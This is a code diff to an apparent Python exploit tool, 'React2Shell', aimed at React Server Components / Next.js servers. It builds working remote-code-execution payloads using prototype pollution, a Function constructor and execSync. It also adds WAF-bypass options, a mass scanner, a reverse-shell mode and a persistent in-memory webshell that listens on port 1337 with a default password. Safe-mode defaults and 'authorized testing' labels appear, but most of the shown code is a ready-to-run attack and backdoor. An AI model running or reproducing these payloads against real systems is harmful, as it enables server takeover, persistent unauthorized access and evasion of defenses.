@@ -24,6 +24,8 @@ import string
 import base64
 import threading
 import time
+import shlex
+import ipaddress
 import readline  # For command history in interactive mode
 from datetime import datetime, timezone
 from concurrent.futures import ThreadPoolExecutor, as_completed
@@ -43,6 +45,30 @@ try:
     HAS_TQDM = True
 except ImportError:
     HAS_TQDM = False
+
+
+# =============================================================================
+# CONSTANTS
+# =============================================================================
+
+# Protocol markers
+REDIRECT_PREFIX = "NEXT_REDIRECT"
+REDIRECT_FORMAT = "{prefix};push;/login?a={encoded};307;"
+FLIGHT_STATUS_RESOLVED = "resolved_model"
+FLIGHT_BLOB_MARKER = "$B1337"
+FLIGHT_CHUNKS_REF = "$Q2"
+
+# Payload structure
+PROTO_POLLUTION_REF = "$1:__proto__:then"
+FUNC_CONSTRUCTOR_REF = "$1:constructor:constructor"
+
+# Default paths
+DEFAULT_PATH = "/"
+DEFAULT_OUTPUT_FILE = "/tmp/r2s_out.txt"
+
+# Rate limiting defaults
+DEFAULT_RATE_LIMIT = 0  # 0 = no limit
+DEFAULT_RATE_DELAY = 0.0  # seconds between requests
 
 
 # =============================================================================
@@ -162,33 +188,33 @@ class Colors:
     RESET = "\033[0m"
 
     # Metasploit-style prefixes
-    @staticmethod
-    def success(msg: str) -> str:
-        return f"\033[92m[+]\033[0m {msg}"
+    @classmethod
+    def success(cls, msg: str) -> str:
+        return f"{cls.GREEN}[+]{cls.RESET} {msg}"
 
-    @staticmethod
-    def info(msg: str) -> str:
-        return f"\033[94m[*]\033[0m {msg}"
+    @classmethod
+    def info(cls, msg: str) -> str:
+        return f"{cls.BLUE}[*]{cls.RESET} {msg}"
 
-    @staticmethod
-    def warning(msg: str) -> str:
-        return f"\033[93m[!]\033[0m {msg}"
+    @classmethod
+    def warning(cls, msg: str) -> str:
+        return f"{cls.YELLOW}[!]{cls.RESET} {msg}"
 
-    @staticmethod
-    def error(msg: str) -> str:
-        return f"\033[91m[-]\033[0m {msg}"
+    @classmethod
+    def error(cls, msg: str) -> str:
+        return f"{cls.RED}[-]{cls.RESET} {msg}"
 
-    @staticmethod
-    def vuln(msg: str) -> str:
-        return f"\033[91m\033[1m[+]\033[0m {msg} \033[91m\033[1m[VULNERABLE]\033[0m"
+    @classmethod
+    def vuln(cls, msg: str) -> str:
+        return f"{cls.RED}{cls.BOLD}[+]{cls.RESET} {msg} {cls.RED}{cls.BOLD}[VULNERABLE]{cls.RESET}"
 
-    @staticmethod
-    def safe(msg: str) -> str:
-        return f"\033[92m\033[1m[-]\033[0m {msg} \033[92m\033[1m[NOT VULNERABLE]\033[0m"
+    @classmethod
+    def safe(cls, msg: str) -> str:
+        return f"{cls.GREEN}{cls.BOLD}[-]{cls.RESET} {msg} {cls.GREEN}{cls.BOLD}[NOT VULNERABLE]{cls.RESET}"
 
-    @staticmethod
-    def status(msg: str) -> str:
-        return f"\033[96m[>]\033[0m {msg}"
+    @classmethod
+    def status(cls, msg: str) -> str:
+        return f"{cls.CYAN}[>]{cls.RESET} {msg}"
 
 
 def disable_colors():
@@ -309,7 +335,7 @@ def version_in_range(version: str, min_ver: str, max_ver: str) -> bool:
         v_min = parse_version(min_ver)
         v_max = parse_version(max_ver)
         return v_min <= v <= v_max
-    except:
+    except (ValueError, TypeError, AttributeError):
         return False
 
 
@@ -473,72 +499,106 @@ def check_lock_file(file_path: Path) -> Optional[Dict]:
 # PAYLOAD BUILDERS
 # =============================================================================
 
+def escape_shell_arg(cmd: str) -> str:
+    """
+    Escape a command for safe embedding in shell context.
+    Uses single-quote escaping: replace ' with '\''
+    """
+    # For single-quoted strings, escape single quotes
+    return cmd.replace("'", "'\\''")
+
+
+def build_multipart_body(boundary: str, parts: List[Tuple[str, str]],
+                         junk_data: Optional[Tuple[str, str]] = None) -> str:
+    """
+    Build multipart form body from parts.
+
+    Args:
+        boundary: The boundary string (without --)
+        parts: List of (field_name, field_value) tuples
+        junk_data: Optional (field_name, junk_content) for WAF bypass
+    """
+    body_parts = []
+
+    # Add junk data first if provided (for WAF bypass)
+    if junk_data:
+        body_parts.extend([
+            f"--{boundary}",
+            f'Content-Disposition: form-data; name="{junk_data[0]}"',
+            "",
+            junk_data[1]
+        ])
+
+    # Add actual payload parts
+    for field_name, field_value in parts:
+        body_parts.extend([
+            f"--{boundary}",
+            f'Content-Disposition: form-data; name="{field_name}"',
+            "",
+            field_value
+        ])
+
+    body_parts.append(f"--{boundary}--")
+    return "\r\n".join(body_parts)
+
+
 def build_rce_payload(cmd: str, windows: bool = False, waf_bypass: bool = False,
                       waf_size_kb: int = 128, vercel_bypass: bool = False,
                       unicode_bypass: bool = False) -> Tuple[str, str]:
-    """Build RCE payload with various bypass options."""
+    """Build RCE payload with various bypass options using json.dumps for proper escaping."""
     boundary = random_boundary()
     boundary_clean = boundary.replace("----", "")
 
-    # Escape command for JSON
-    cmd_escaped = cmd.replace("\\", "\\\\").replace("'", "\\'")
+    # Properly escape command for shell execution
+    cmd_escaped = escape_shell_arg(cmd)
 
     if windows:
-        exec_cmd = f"powershell -c \\\"{cmd_escaped}\\\""
+        exec_cmd = f"powershell -c '{cmd_escaped}'"
     else:
         exec_cmd = cmd_escaped
 
-    # Build prefix payload
-    prefix = (
+    # Build JavaScript prefix payload
+    prefix_code = (
         f"var res=process.mainModule.require('child_process').execSync('{exec_cmd}')"
         f".toString().trim();var encoded=Buffer.from(res).toString('base64');"
-        f"throw Object.assign(new Error('NEXT_REDIRECT'),"
-        f"{{digest: `NEXT_REDIRECT;push;/login?a=${{encoded}};307;`}});"
+        f"throw Object.assign(new Error('{REDIRECT_PREFIX}'),"
+        f"{{digest:'{REDIRECT_PREFIX};push;/login?a='+encoded+';307;'}});"
     )
 
+    # Build payload object using proper JSON serialization
+    part0_obj = {
+        "then": PROTO_POLLUTION_REF,
+        "status": FLIGHT_STATUS_RESOLVED,
+        "reason": -1,
+        "value": f'{{"then":"{FLIGHT_BLOB_MARKER}"}}',
+        "_response": {
+            "_prefix": prefix_code,
+            "_chunks": FLIGHT_CHUNKS_REF,
+            "_formData": {
+                "get": "$3:\"$$:constructor:constructor" if vercel_bypass else FUNC_CONSTRUCTOR_REF
+            }
+        }
+    }
+    part0 = json.dumps(part0_obj)
+
+    # Apply unicode encoding for WAF bypass
+    if unicode_bypass:
+        part0 = encode_unicode(part0)
+
+    # Prepare junk data for WAF bypass
+    junk = None
+    if waf_bypass:
+        junk_name = random_string(12, string.ascii_lowercase)
+        junk_content = random_string(waf_size_kb * 1024)
+        junk = (junk_name, junk_content)
+
+    # Build parts list
+    parts = [("0", part0), ("1", '"$@0"'), ("2", "[]")]
+
     if vercel_bypass:
-        # Vercel WAF bypass variant
-        part0 = (
-            '{"then":"$1:__proto__:then","status":"resolved_model","reason":-1,'
-            '"value":"{\\"then\\":\\"$B1337\\"}","_response":{"_prefix":"'
-            + prefix + '","_chunks":"$Q2","_formData":{"get":"$3:\\"$$:constructor:constructor"}}}'
-        )
-        body_parts = [
-            f"--{boundary_clean}\r\nContent-Disposition: form-data; name=\"0\"\r\n\r\n{part0}",
-            f"--{boundary_clean}\r\nContent-Disposition: form-data; name=\"1\"\r\n\r\n\"$@0\"",
-            f"--{boundary_clean}\r\nContent-Disposition: form-data; name=\"2\"\r\n\r\n[]",
-            f"--{boundary_clean}\r\nContent-Disposition: form-data; name=\"3\"\r\n\r\n{{\"\\\"$$\":{{}}}}",
-            f"--{boundary_clean}--"
-        ]
-    else:
-        part0 = (
-            '{"then":"$1:__proto__:then","status":"resolved_model","reason":-1,'
-            '"value":"{\\"then\\":\\"$B1337\\"}","_response":{"_prefix":"'
-            + prefix + '","_chunks":"$Q2","_formData":{"get":"$1:constructor:constructor"}}}'
-        )
+        parts.append(("3", '{""\\"$$":{}}'))
 
-        # Apply unicode encoding for WAF bypass
-        if unicode_bypass:
-            part0 = encode_unicode(part0)
-
-        body_parts = []
-
-        # Add WAF bypass junk data
-        if waf_bypass:
-            junk_name = random_string(12, string.ascii_lowercase)
-            junk_data = random_string(waf_size_kb * 1024)
-            body_parts.append(
-                f"--{boundary_clean}\r\nContent-Disposition: form-data; name=\"{junk_name}\"\r\n\r\n{junk_data}"
-            )
-
-        body_parts.extend([
-            f"--{boundary_clean}\r\nContent-Disposition: form-data; name=\"0\"\r\n\r\n{part0}",
-            f"--{boundary_clean}\r\nContent-Disposition: form-data; name=\"1\"\r\n\r\n\"$@0\"",
-            f"--{boundary_clean}\r\nContent-Disposition: form-data; name=\"2\"\r\n\r\n[]",
-            f"--{boundary_clean}--"
-        ])
-
-    body = "\r\n".join(body_parts)
+    body = build_multipart_body(boundary_clean, parts, junk)
     content_type = f"multipart/form-data; boundary={boundary_clean}"
     return body, content_type
 
@@ -673,28 +733,33 @@ def build_waku_payload(cmd: str, windows: bool = False, waf_bypass: bool = False
     return body, content_type
 
 
-def build_webshell_payload(password: str = "react2shell") -> Tuple[str, str]:
+def build_webshell_payload(password: str = "react2shell", port: int = 1337) -> Tuple[str, str]:
     """
     Build in-memory webshell payload for persistence.
-    Injects a hidden webshell that persists in server memory.
-    Access via: POST /?shell=<password>&cmd=<command>
+    Creates a new HTTP server on a separate port for backdoor access.
+    Access via: curl 'http://target:<port>/?p=<password>&cmd=<command>'
     """
     boundary = random_boundary()
     boundary_clean = boundary.replace("----", "")
 
-    # In-memory webshell - hooks into request handler
+    # In-memory webshell - creates new HTTP server on specified port
+    # Uses ?p=<password>&cmd=<command> for authentication and execution
     webshell_code = (
-        f"if(!global._r2s){{global._r2s=true;"
-        f"var http=process.mainModule.require('http');"
-        f"var orig=http.createServer;"
-        f"http.createServer=function(h){{return orig(function(q,s){{"
-        f"if(q.url&&q.url.includes('shell={password}')){{var u=new URL(q.url,'http://x');"
-        f"var c=u.searchParams.get('cmd');"
-        f"if(c){{var r=process.mainModule.require('child_process').execSync(c).toString();"
-        f"s.writeHead(200);s.end(r);return;}}}}"
-        f"return h(q,s);}})}};}};"
+        f"if(!global._r2s){{"
+        f"global._r2s=true;"
+        f"var h=process.mainModule.require('http');"
+        f"var c=process.mainModule.require('child_process');"
+        f"var u=process.mainModule.require('url');"
+        f"h.createServer(function(q,r){{"
+        f"var p=u.parse(q.url,true).query;"
+        f"if(p.p==='{password}'&&p.cmd){{"
+        f"try{{var o=c.execSync(p.cmd).toString();r.writeHead(200);r.end(o);}}"
+        f"catch(e){{r.writeHead(500);r.end(e.message);}}"
+        f"}}else{{r.writeHead(403);r.end('Forbidden');}}"
+        f"}}).listen({port});"
+        f"}};"
         f"throw Object.assign(new Error('NEXT_REDIRECT'),"
-        f"{{digest:'NEXT_REDIRECT;push;/shell-installed;307;'}});"
+        f"{{digest:'NEXT_REDIRECT;push;/shell-installed-{port};307;'}});"
     )
 
     part0 = (
@@ -1069,7 +1134,7 @@ class React2Shell:
         encoded = unquote(match.group(1))
         try:
             return True, base64.b64decode(encoded).decode('utf-8')
-        except:
+        except (ValueError, UnicodeDecodeError, base64.binascii.Error):
             return True, encoded
 
     def check(self, url: str, path: str = "/", safe_mode: bool = False,
@@ -1334,8 +1399,9 @@ class React2Shell:
 def scan_targets(scanner: React2Shell, targets: List[str], paths: List[str],
                  threads: int, safe_mode: bool, waf_bypass: bool,
                  waf_size_kb: int, vercel_bypass: bool, windows: bool,
-                 verbose: bool, quiet: bool, output_file: str) -> List[dict]:
-    """Scan multiple targets."""
+                 verbose: bool, quiet: bool, output_file: str,
+                 rate_limit: float = 0.0) -> List[dict]:
+    """Scan multiple targets with optional rate limiting."""
     results = []
     vulnerable_count = 0
 
@@ -1350,6 +1416,8 @@ def scan_targets(scanner: React2Shell, targets: List[str], paths: List[str],
     if not quiet:
         print(Colors.info(f"Scanning {len(targets)} target(s) with {len(paths)} path(s) ({total} total)"))
         print(Colors.info(f"Threads: {threads}, Timeout: {scanner.timeout}s"))
+        if rate_limit > 0:
+            print(Colors.info(f"Rate limit: {rate_limit}s delay between requests"))
         if safe_mode:
             print(Colors.info("Mode: Safe side-channel detection"))
         else:
@@ -1362,9 +1430,13 @@ def scan_targets(scanner: React2Shell, targets: List[str], paths: List[str],
 
     def check_task(task):
         target, path = task
-        return scanner.check(target, path, safe_mode=safe_mode,
+        result = scanner.check(target, path, safe_mode=safe_mode,
                            waf_bypass=waf_bypass, waf_size_kb=waf_size_kb,
                            vercel_bypass=vercel_bypass, windows=windows)
+        # Apply rate limiting if configured
+        if rate_limit > 0:
+            time.sleep(rate_limit)
+        return result
 
     if threads == 1 or total == 1:
         # Single-threaded
@@ -1449,13 +1521,16 @@ def main():
         formatter_class=argparse.RawDescriptionHelpFormatter,
         epilog="""
 Examples:
-  # Check single URL
+  # Check single URL (safe mode - default)
   %(prog)s https://target.com
 
-  # Scan list of URLs
+  # Scan list of URLs (safe detection, no code execution)
   %(prog)s targets.txt
 
-  # Execute command
+  # RCE proof-of-concept (requires explicit opt-in)
+  %(prog)s https://target.com --rce
+
+  # Execute command (authorized testing only)
   %(prog)s https://target.com -c "id"
 
   # Interactive shell
@@ -1468,10 +1543,7 @@ Examples:
   %(prog)s https://target.com -P /api,/_next
 
   # WAF bypass (junk data + unicode)
-  %(prog)s https://target.com -w -u
-
-  # Safe detection (no code execution)
-  %(prog)s targets.txt -s
+  %(prog)s https://target.com -w -u --rce
 
   # Scan local project for vulnerable versions
   %(prog)s --local /path/to/project
@@ -1547,7 +1619,14 @@ Examples:
     scan_group.add_argument(
         "-s", "--safe",
         action="store_true",
-        help="Safe mode - side-channel detection without code execution"
+        default=True,
+        help="Safe mode - side-channel detection without code execution (default)"
+    )
+    scan_group.add_argument(
+        "--rce", "--poc",
+        action="store_true",
+        dest="rce_mode",
+        help="RCE proof-of-concept mode - executes code on target (use with authorization)"
     )
     scan_group.add_argument(
         "-L", "--local",
@@ -1575,7 +1654,14 @@ Examples:
         metavar="PASSWORD",
         nargs="?",
         const="react2shell",
-        help="Install in-memory webshell (default password: react2shell)"
+        help="Install in-memory webshell on port 1337 (default password: react2shell)"
+    )
+    scan_group.add_argument(
+        "--rate-limit",
+        type=float,
+        default=0,
+        metavar="DELAY",
+        help="Rate limit: delay in seconds between requests (default: 0 = no limit)"
     )
 
     # Bypass options
@@ -1795,7 +1881,8 @@ Examples:
     # Webshell installation mode
     if args.webshell:
         password = args.webshell
-        print(Colors.warning(f"Installing in-memory webshell (password: {password})..."))
+        webshell_port = 1337
+        print(Colors.info(f"Installing in-memory webshell on port {webshell_port} (password: {password})..."))
         for target in targets:
             for path in paths:
                 body, content_type = build_webshell_payload(password)
@@ -1811,8 +1898,11 @@ Examples:
                         proxies=scanner.proxies
                     )
                     if response.status_code in [303, 307] or "shell-installed" in response.headers.get("X-Action-Redirect", ""):
+                        # Extract host from target URL for webshell access
+                        parsed = urlparse(target)
+                        webshell_host = parsed.hostname
                         print(Colors.success(f"Webshell installed on {target}"))
-                        print(Colors.info(f"Access via: curl '{target}/?shell={password}&cmd=id'"))
+                        print(Colors.info(f"Access via: curl 'http://{webshell_host}:{webshell_port}/?p={password}&cmd=id'"))
                     else:
                         print(Colors.error(f"Failed to install webshell on {target} (Status: {response.status_code})"))
                 except Exception as e:
@@ -1840,6 +1930,23 @@ Examples:
         if not args.lhost or not args.lport:
             print(Colors.error("-l/--lhost and -p/--lport required for reverse shell"))
             sys.exit(1)
+
+        # Validate lhost is a valid IP address or hostname
+        try:
+            # Try parsing as IP address first
+            ipaddress.ip_address(args.lhost)
+        except ValueError:
+            # Not an IP, check if it looks like a valid hostname
+            if not re.match(r'^[a-zA-Z0-9]([a-zA-Z0-9\-]{0,61}[a-zA-Z0-9])?(\.[a-zA-Z0-9]([a-zA-Z0-9\-]{0,61}[a-zA-Z0-9])?)*$', args.lhost):
+                print(Colors.error(f"Invalid listener host: {args.lhost}"))
+                print(Colors.info("Please provide a valid IP address or hostname"))
+                sys.exit(1)
+
+        # Validate port is in valid range
+        if not (1 <= args.lport <= 65535):
+            print(Colors.error(f"Invalid port: {args.lport} (must be 1-65535)"))
+            sys.exit(1)
+
         if len(targets) > 1:
             print(Colors.error("Reverse shell only supports single target"))
             sys.exit(1)
@@ -1900,17 +2007,20 @@ Examples:
         sys.exit(0)
 
     # Scan mode (default)
+    # Safe mode is default unless --rce is explicitly specified
+    use_safe_mode = not args.rce_mode
     results = scan_targets(
         scanner, targets, paths,
         threads=args.threads,
-        safe_mode=args.safe,
+        safe_mode=use_safe_mode,
         waf_bypass=args.waf_bypass,
         waf_size_kb=args.waf_size,
         vercel_bypass=args.vercel_bypass,
         windows=args.windows,
         verbose=args.verbose,
         quiet=args.quiet,
-        output_file=args.output
+        output_file=args.output,
+        rate_limit=args.rate_limit
     )
 
     # Exit code based on findings
